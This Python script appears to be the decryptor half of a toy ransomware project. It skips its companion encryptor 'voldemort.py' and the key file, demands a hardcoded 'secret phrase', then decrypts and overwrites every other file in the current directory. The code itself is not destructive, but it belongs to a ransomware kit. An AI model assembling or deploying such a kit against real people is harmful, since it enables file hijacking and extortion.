import os
from cryptography.fernet import Fernet


files = [] 
for file in os.listdir():
    if file =="voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


print("The number of files is {} and the files are {}".format(len(files),files))


with open("thekey.key", 'rb') as key:
    secretkey = key.read()
    #secretkey = secretkey.decode('utf-8')
    print(secretkey)

secretpassword = "ilovecoding"

user_phrase = input("Enter the secret phase to decrypt your file/s!!! \n")
if user_phrase != secretpassword:
    print("Wrong password!!!!")
    import sys
    sys.exit() 

for file in files:
    with open(file,'rb') as thefile:
        contents = thefile.read()
        print("contents is",contents)

    print("\n")
    contents_decrypted = Fernet(secretkey).decrypt(contents) #encrypt the file content
    print("Content decrypted: ", contents_decrypted.decode('utf-8'))
    with open(file,'wb') as thefile:
        thefile.write(contents_decrypted)
